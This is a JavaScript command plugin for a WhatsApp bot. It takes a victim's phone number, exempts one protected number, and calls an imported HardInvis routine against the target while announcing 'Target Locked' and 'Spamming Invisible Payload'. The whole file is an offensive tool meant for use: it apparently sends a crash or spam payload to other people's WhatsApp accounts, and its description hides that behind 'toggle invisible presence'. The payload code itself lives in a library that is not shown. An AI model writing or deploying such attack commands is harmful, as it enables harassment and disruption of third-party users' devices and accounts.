const { HardInvis } = require('../lib/rizoinvis');

module.exports = {
  name: "rizoinvis",
  commands: ['hardinvis', 'rizoinvis', 'hinvis'],
  category: "owner",
  description: "Toggle invisible presence state",
  async execute(sock, m, args) {
    if (!args[0]) {
      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizoinvis 923xx` }, { quoted: m });
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
    }

    let target = pepec + '@s.whatsapp.net';
    await sock.sendMessage(m.chat, { text: `👻 *HardInvis Target Locked:* ${pepec}\n⚡ *Spamming Invisible Payload...*` }, { quoted: m });

    try {
      await HardInvis(sock, target);
      await sock.sendMessage(m.chat, { react: { text: "👻", key: m.key } });
    } catch (error) {
      await sock.sendMessage(m.chat, { text: "⚠️ Error: HardInvis plugin execute karte waqt masla aaya hai." }, { quoted: m });
    }
  }
};
